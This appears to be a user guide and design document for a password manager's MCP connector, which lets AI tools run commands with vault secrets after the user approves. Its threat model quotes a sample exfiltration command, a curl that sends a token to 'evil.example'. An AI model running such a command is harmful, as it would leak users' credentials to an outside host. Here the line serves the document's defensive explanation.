# The Passyble connector for AI tools

The connector lets Claude Code, Codex, Claude Desktop and any other [MCP](https://modelcontextprotocol.io) client use
secrets from your Passyble vault, with your approval. By default the AI never sees a secret: it asks Passyble to run a
command with the secret in an environment variable, Passyble shows you the exact command, and the AI gets the command's
output with every secret value hidden. Showing a value to the AI is a separate request that asks you every single time.

This page is the user guide (sections 1 to 4) and the design (sections 5 to 8). The wire protocol is in
[PROTOCOL.md](PROTOCOL.md) §2, "Connector for AI tools".

Contents:

1. [Share an item with AI tools](#1-share-an-item-with-ai-tools)
2. [Connect an AI tool](#2-connect-an-ai-tool)
3. [Approving requests](#3-approving-requests)
4. [What the AI can and can't do](#4-what-the-ai-can-and-cant-do)
5. [Design](#5-design)
6. [Security](#6-security)
7. [Files](#7-files)
8. [Not done yet](#8-not-done-yet)

## 1. Share an item with AI tools

AI tools see only the items you share. Every other item doesn't exist for them, names included.

1. Open the item in Passyble and choose **Edit**.
2. Turn on **Available to AI tools**.
3. Choose **When an AI tool uses it**:
   * **Ask every time** (the default): every command that uses the item asks you first.
   * **Allow without asking**: commands may use it without a prompt while Passyble is unlocked. Each use is still
     logged. Showing a value to the AI still asks, every time.
4. **Save**.

**Settings → Autofill → AI tools** lists the items you share. To stop sharing one, turn the switch off in its editor.

The setting syncs with the item to your other devices. A Passyble app that doesn't know about AI tools yet (the
Android app today) shows it as a custom field called "Passyble: available to AI tools"; deleting that field there
stops sharing the item. Importing a file never shares anything, not even Passyble's own export.

## 2. Connect an AI tool

The connector is `passyble-mcp` (`passyble-mcp.exe` on Windows), installed beside Passyble. **Settings → Autofill → AI
tools → Connect an AI tool** shows the commands below with the real path on your PC and copy buttons. Passyble must be
running when the AI tool uses it. Restart the AI tool after adding the connector.

The default install paths are `%LOCALAPPDATA%\Programs\Passyble\passyble-mcp.exe` (the per-user setup),
`C:\Program Files\Passyble\passyble-mcp.exe` (the MSI) and `/usr/bin/passyble-mcp` (the Linux .deb and .rpm). The
AppImage has no fixed path yet ([Not done yet](#8-not-done-yet)).

**Claude Code.** In a terminal:

```sh
claude mcp add --scope user passyble -- "C:\Users\you\AppData\Local\Programs\Passyble\passyble-mcp.exe"
```

`--scope user` makes it available in all your projects; without it, only in the current project. Check it with
`claude mcp list`, or `/mcp` inside Claude Code.

**Codex.** Add to `~/.codex/config.toml` (`%USERPROFILE%\.codex\config.toml` on Windows):

```toml
[mcp_servers.passyble]
command = "C:\\Users\\you\\AppData\\Local\\Programs\\Passyble\\passyble-mcp.exe"
# Leave time for the approval prompt (up to 2 minutes) and the command.
tool_timeout_sec = 720
```

Codex gives a tool call 60 seconds by default, too short to answer the approval prompt. The CLI does the same
without the timeout: `codex mcp add passyble -- "<path>"`.

**Claude Desktop and other MCP clients.** Add the server to the client's MCP configuration (Claude Desktop:
`claude_desktop_config.json`, Settings → Developer → Edit Config):

```json
{
  "mcpServers": {
    "passyble": {
      "command": "C:\\Users\\you\\AppData\\Local\\Programs\\Passyble\\passyble-mcp.exe",
      "args": []
    }
  }
}
```

If the client limits how long a tool call may take, give it at least 3 minutes. Don't add the connector to a
project's shared configuration (`.mcp.json`): it belongs to you, not to the repository.

## 3. Approving requests

When an AI tool wants to run a command with an item marked **Ask every time**, Passyble shows:

* the AI tool: the name it reports (for example Claude Code) and the program that started the connector (for example
  `claude.exe`);
* each secret: the environment variable, the item and the field;
* the **exact command** (the program's full path and its arguments) and the **working directory**.

Read the command. Then choose:

* **Deny** (the default, also Esc, closing the window, or no answer within 2 minutes);
* **Allow once**: this command only;
* **Allow until locked**: this AI tool may use these items again without asking until Passyble locks.

If the vault's **Require Windows Hello before each fill** is on, Windows Hello (or the master password) follows.
If Passyble is locked, it asks you to unlock first.

**Showing a value to the AI** (`reveal_secret`) has its own prompt, every time, with a warning: the value goes into
the AI chat and to the AI provider's servers, where Passyble can't protect or delete it. The AI's reason is shown as
its own words. After **Show it to the AI** comes Windows Hello or the master password.

**Settings → Autofill → AI tools** also lists the **Allowed until Passyble locks** permissions (with **Revoke**) and
the **Recent requests**: time, AI tool, items, the command, and how it ended (denied, exit code, stopped at the time
limit, shown to the AI). The log is kept in memory until Passyble quits and never holds a secret value.

After three denials within two minutes, Passyble refuses that AI tool's requests without asking for two minutes.

## 4. What the AI can and can't do

The connector gives the AI three tools:

| tool | what it does |
|---|---|
| `list_items` | The shared items: id, title, kind, websites, username, the names of their fields (`password`, `totp` for the current 2FA code, `notes`, `website`, card fields, custom field names) and whether using them asks. Never a value. |
| `run_with_secret` | Runs a command with fields of shared items in environment variables (`{"GITHUB_TOKEN": {"item": "GitHub", "field": "password"}}`). No shell: the program runs directly with the arguments as given. Up to 60 s by default, at most 10 minutes; up to 100 KB of output per stream. |
| `reveal_secret` | Returns one value to the AI, after your approval, every time. |

Tell the AI what you want ("deploy with my Netlify token from Passyble") and it uses `run_with_secret`. The tool
descriptions steer it there and away from `reveal_secret`.

In the command's output (stdout and stderr) every secret value it got is replaced with `<concealed by Passyble>`:
as it is, base64 (also inside a longer base64 string such as an HTTP Basic header), hexadecimal, URL-encoded, as a
JSON string and as UTF-16.

### Shared vaults (Teams, Family, direct shares)

Marked items of every open vault take part, and once more than one vault is open `list_items` says which vault each
item is in (prompts name it too). On top of the rules above:

- **Every use asks.** In a shared vault the mark may have been set by another member, so "Allow without asking" counts
  as "Ask every time" there: only you decide when your AI tool uses a shared vault's secrets. "Allow until locked"
  works as usual.
- **Fill-only members get no secret.** If you may only fill a vault's logins, AI tools get what the app shows you and
  nothing more: no password, 2FA code, card number, security code or PIN, and no hidden field (passkeys are never a
  field). Asking for one answers `fill_only`.
- **View-only members** may let AI tools use the secrets they can see; nothing the connector does writes to a vault,
  and the editor (where the mark is set) refuses changes in a vault you can't edit.
- **Your organisation's policy.** While a Team or Family policy turns off exporting (`export_allowed: false`), its
  shared vaults don't exist for AI tools at all: a secret given to an AI tool leaves Passyble just as an export does.
  Settings > AI tools lists such items as hidden by the policy. Vaults opened through emergency access never take part.
- **Update required.** While Passyble is below the minimum version its owner set, `run_with_secret` and
  `reveal_secret` are refused until you update; `list_items` still answers.

The connector never finds items by website, so the lookalike-site checks of filling and saving don't apply to it.

## 5. Design

```
AI tool (MCP client) ──stdio, JSON-RPC 2.0──▶ passyble-mcp ──pipe / unix socket──▶ Passyble (agent + Ui)
                                                  │  ▲                                   │
                                                  │  └──── secret values (ai.run) ◀──────┘ after approval
                                                  └──▶ child process: secrets in its environment, output captured and masked
```

* **Connector** (`Core/mcp`, crate `passyble-mcp`): a small MCP server over stdio. JSON-RPC 2.0 is hand-rolled
  (`initialize`, `ping`, `tools/list`, `tools/call`, `notifications/cancelled`), so it has no MCP framework. It
  speaks MCP 2025-11-25, 2025-06-18, 2025-03-26 and 2024-11-05. It holds no secret between calls.
* **Delivery: inject, reveal optional.** `run_with_secret` works like `op run`: the connector asks the agent for the
  values (`ai.run`), and only after the user approved does the agent return them. The connector starts the program
  itself (no shell), with the values only in its environment (never on a command line), stdin closed, stdout and
  stderr captured, a time limit (its whole process tree is stopped: a job object on Windows, the process group on
  unix), an output cap, and the masking above. It reports how the command ended (`ai.run_done`) for the log.
  `reveal_secret` (`ai.reveal`) is a separate request with a separate prompt.
* **Scope: only items you share.** The mark is a **custom field** of the item, `Passyble: available to AI tools`,
  with the value `Ask every time` or `Allow without asking` (`pass_core::AiAccess`, `core/src/ai.rs`), not a new
  item key. Every client that reads the vault format keeps custom fields: pass-core (sealing, sync merges, which work
  on whole items), the Android app (the UniFFI `Item` record carries `fields`, and its editor saves them back), the
  browser extension's WebAssembly (its editor never touches `fields`) and the server (which only stores the
  encrypted file). A new item key would be dropped by every one of today's clients the first time it saved the
  item. A client from before custom fields drops the field, which unshares the item: the safe direction. Reading it
  is strict about the name and lenient about the value: an empty value, `no`, `off`, `false` or `0` is not shared,
  anything unknown is "Ask every time". Items in the trash are never shared. Imports strip it. The desktop app shows
  it as a switch and leaves it out of the custom fields list, search and the "has custom fields" flag. Tests:
  `ai_tools_mark_survives_round_trips_merges_and_other_clients` and `imports_never_share_with_ai_tools`
  (`core/src/vault.rs`), `an_extension_edit_keeps_the_ai_mark` (`agent/tests/ai.rs`).
* **Approval** is the agent's (`agent/src/ai.rs`, `agent/src/protocol/ai.rs`), so no client can skip it: an item
  marked "Ask every time" without a grant for this client asks `Ui::confirm_ai_run` (Deny, Allow once, Allow until
  the vault locks); `ai.reveal` always asks `Ui::confirm_ai_reveal`, whatever the item says and whatever was granted.
  A grant is bound to the item and the client (`clientInfo.name` and the program that started the connector) and
  lives in memory until the next lock of any kind (or a switch to another vault). One prompt is shown at a time;
  up to three more requests wait behind it, more answer `rate_limited`. The desktop app's prompts time out after 2
  minutes (a denial) and add Windows Hello or the master password (`ui.rs`): for a command when the vault's per-fill
  policy is on, for a reveal always.
* **Not activity.** AI requests never count as use for the auto-lock, so an AI tool alone never keeps the vault
  unlocked (and locking ends every grant).

## 6. Security

What the connector defends against, and what it can't:

* **A prompt-injected AI asking for secrets.** It can only reach items you shared. Every use of an "Ask every time"
  item shows you the exact command; a reveal always asks, with a plain warning. Denials and timeouts are clean MCP
  tool errors that tell the AI not to ask again, and three denials silence that AI tool for two minutes. Requests
  are limited to 30 a minute.
* **A command that sends the secret somewhere** (`curl https://evil.example -d "$TOKEN"`). **Masking can't stop
  this**: the value leaves through the network, not the output. This is why the prompt shows the exact program,
  arguments and working directory, and why "Ask every time" is the default. A shell command (`bash -c "..."`) can do
  anything its text says, and a script it runs can do more than its name suggests: allow only commands you
  understand. "Allow without asking" and "Allow until locked" trust the AI tool with that item; use them for
  low-value secrets.
* **Output that echoes the secret.** Masked in stdout and stderr, as it is and in the common encodings. Not masked:
  a value the command transforms (reversed, split, encrypted, compressed), or one it writes to a file or another
  process. Arguments are passed as given; a shell that expands `$TOKEN` into another program's arguments puts it on
  that program's command line (visible to other processes of the user), so prefer tools that read the variable.
* **Another local process pretending to be the connector.** The agent accepts the pipe connection only from the
  `passyble-mcp` installed beside `Pass.exe` (Windows: `GetNamedPipeClientProcessId` and the process image; Linux:
  `SO_PEERCRED` and `/proc/<pid>/exe`; macOS: `LOCAL_PEERPID`), and that connection may send `ai.*` requests and
  nothing else, while the browser's native host may not send `ai.*`. The connector gets no pushed events.
* **Another process pretending to be the agent.** The connector checks that the pipe is served by the `Pass.exe`
  beside it (`ipc::server_is_allowed`, as the native host does). It never sends a secret to the agent anyway: values
  only travel from the agent to the connector.
* **Code running as you.** It can start `passyble-mcp` itself with any `clientInfo` and ask, just as it can drive the
  browser extension; the prompt is the guard. It could also read the connector's memory while a command runs.
* **Secrets at rest and in logs.** Values are never logged (the log has titles, commands and outcomes). The agent
  clears its response line once written; the connector keeps values in zeroizing buffers, clears the captured
  output after masking, and drops the `Command` (which holds copies) as soon as the child started. The child's own
  environment is the child's.

## 7. Files

| where | what |
|---|---|
| `core/src/ai.rs` | `AiAccess`, `AI_ACCESS_FIELD`, `Item::ai_access` / `set_ai_access` (UniFFI: `item_ai_access`, `item_with_ai_access`) |
| `agent/src/ai.rs` | grants, the log, denials, the prompt slot; `AiClient`, `AiRunRequest`, `AiRevealRequest`, `AiDecision` |
| `agent/src/protocol/ai.rs` | `ai.status`, `ai.list`, `ai.run`, `ai.run_done`, `ai.reveal` (`Agent::handle_ai_line`) |
| `agent/src/ipc.rs` | `Server::start_restricted_with_ai`: who may send `ai.*` |
| `mcp/` | `passyble-mcp`: MCP over stdio (`lib.rs`), masking (`mask.rs`), running commands (`run.rs`), the client's program and `PATH` lookup (`process.rs`); end-to-end test `tests/e2e.rs` |
| `desktop-app/src-tauri/src/ai_tools.rs` | Settings → AI tools commands, setup snippets, prompt data |
| `desktop-app/src-tauri/src/ui.rs` | `Ui::confirm_ai_run`, `Ui::confirm_ai_reveal` (prompt window, Windows Hello) |
| `desktop-app/ui/prompt.js`, `views/aitools.js`, `views/editor.js` | the prompts, the AI tools page, the item editor's switch |
| `../Windows/installer/build-native-host.ps1`, `../Linux/installer/before-bundle.sh` | build `passyble-mcp` with the native host for the bundles (`externalBin`) |

## 8. Not done yet

* **Browser fill through the extension.** The agent can already push to the extension (`ipc::Server::notify`
  events such as `lock_state`), but filling a page for an AI tool needs new extension code: an event that names the
  item and the tab, a check that the tab's site matches the login, and the prompt. That is a change to the Extension
  repository and is left for later.
* **Linux AppImage.** The AppImage mounts at a new path at every start. The connector needs to be staged at a fixed
  path the way the native host is (`~/.local/share/Passyble/bin/`, `pass_linux::connector`), with the agent
  allowing that copy. Until then, use the .deb or .rpm for AI tools.
* **macOS.** The connector builds and the agent's peer check covers macOS, but the macOS bundle doesn't ship
  `passyble-mcp` yet, and the connector names the client's program only on Windows and Linux.
* **The Android app** shows the mark as a custom field; a switch like the desktop's is left for its editor.
* **Translations.** The new texts are in English; the other languages fall back to English until translated
  (docs/TRANSLATING.md).
